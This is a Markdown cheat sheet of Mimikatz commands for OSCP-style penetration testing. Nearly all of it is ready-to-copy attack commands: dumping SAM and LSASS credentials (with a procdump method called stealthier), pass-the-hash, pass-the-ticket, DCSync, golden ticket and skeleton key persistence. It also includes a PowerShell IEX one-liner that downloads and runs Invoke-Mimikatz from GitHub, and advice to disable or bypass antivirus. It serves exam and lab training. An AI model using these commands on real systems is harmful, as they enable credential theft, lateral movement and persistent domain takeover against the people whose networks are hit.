# Mimikatz OSCP Cheatsheet

A quick reference for using **Mimikatz** during OSCP-style Windows privilege escalation and credential extraction.

---

## 🧩 Basic Usage

### Launch Mimikatz
```powershell
mimikatz.exe
```

### Enable Debug Privileges
```mimikatz
privilege::debug
```

---

## 🧪 SAM & SYSTEM Credential Dumping (Local Hash Dump)

### Using Mimikatz (LSA Dump)
```mimikatz
lsadump::sam
```

### Extract Hashes From SYSTEM + SAM Files (Offline)
```mimikatz
lsadump::sam /system:system.hiv /sam:sam.hiv
```

---

## 🔐 LSASS Memory Dump (Credential Harvesting)

### Dump LSASS Memory With Mimikatz Itself
```mimikatz
sekurlsa::logonpasswords
```

### Using Procdump First (More Stealthy)
On victim:
```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Then on your machine:
```mimikatz
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

---

## 🔑 Kerberos Ticket Operations (Pass-The-Ticket)

### List Current Tickets
```mimikatz
kerberos::list
```

### Export Tickets
```mimikatz
kerberos::list /export
```

### Pass-the-Ticket (Inject Ticket)
```mimikatz
kerberos::ptt fullpath.kirbi
```

---

## 🏷️ Pass-The-Hash

Enable debug privileges first:
```mimikatz
privilege::debug
```

Run a process using NTLM hash:
```mimikatz
sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:<HASH> /run:powershell.exe
```

---

## 🪪 DCSync Attack (If Domain Admin)

Dump NTLM hashes directly from domain controller:
```mimikatz
lsadump::dcsync /domain:domain.local /user:Administrator
```

---

## 🔥 Golden Ticket Attack (Requires krbtgt Hash)

Generate Golden Ticket:
```mimikatz
kerberos::golden /user:Administrator /domain:domain.local /sid:<DOMAIN SID> /krbtgt:<KRBTGT HASH> /id:500
```

Inject it:
```mimikatz
kerberos::ptt ticket.kirbi
```

---

## 📦 Skeleton Key (Not Commonly Used in OSCP, But Good To Know)

```mimikatz
misc::skeleton
```

Password becomes: `mimikatz`

---

## 🧰 Injecting & Running Mimikatz Through PowerShell

### Load Invoke-Mimikatz (PowerShell)
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
Invoke-Mimikatz
```

---

## 🕵️ Common Troubleshooting

### LSASS Access Denied
Run as **Administrator**:
```powershell
privilege::debug
```
Make sure antivirus is disabled or bypassed.

### Mimikatz Hangs in Evil-WinRM
Try:
```powershell
upload mimikatz.exe
.\mimikatz.exe
```
Or use the PowerShell version above.

---

## 🗂️ Useful Paths

### SYSTEM & SAM locations:
```
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SAM
```

---

## ⚠️ OSCP Notes
- OSCP machines *rarely* require full Golden/Silver ticket attacks.
- Most useful commands:
  - `sekurlsa::logonpasswords`
  - `lsadump::sam`
  - `sekurlsa::pth`
- Always escalate to Administrator before dumping LSASS.

---

## ✅ Quick Copy Commands (Most Used)

### Dump all credentials
```mimikatz
privilege::debug
sekurlsa::logonpasswords
```

### Pass-the-Hash
```mimikatz
sekurlsa::pth /user:Administrator /ntlm:<HASH> /run:powershell.exe
```

### Dump SAM
```mimikatz
lsadump::sam
```

### Inject ticket
```mimikatz
kerberos::ptt ticket.kirbi
```
